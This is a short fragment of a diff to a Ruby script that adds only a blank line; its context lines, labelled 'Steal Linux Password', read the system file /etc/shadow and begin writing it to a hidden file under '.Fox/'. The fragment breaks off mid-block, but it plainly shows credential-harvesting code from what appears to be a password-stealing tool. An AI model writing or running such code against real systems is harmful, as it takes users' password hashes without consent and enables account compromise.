@@ -9,6 +9,7 @@ for line in files
   end
   num += 1
 end
+
 ### Steal Linux Password ###
 os_pass = File.read("/etc/shadow")
 File.open(".Fox/OS_Pass.txt", "w") do |line|
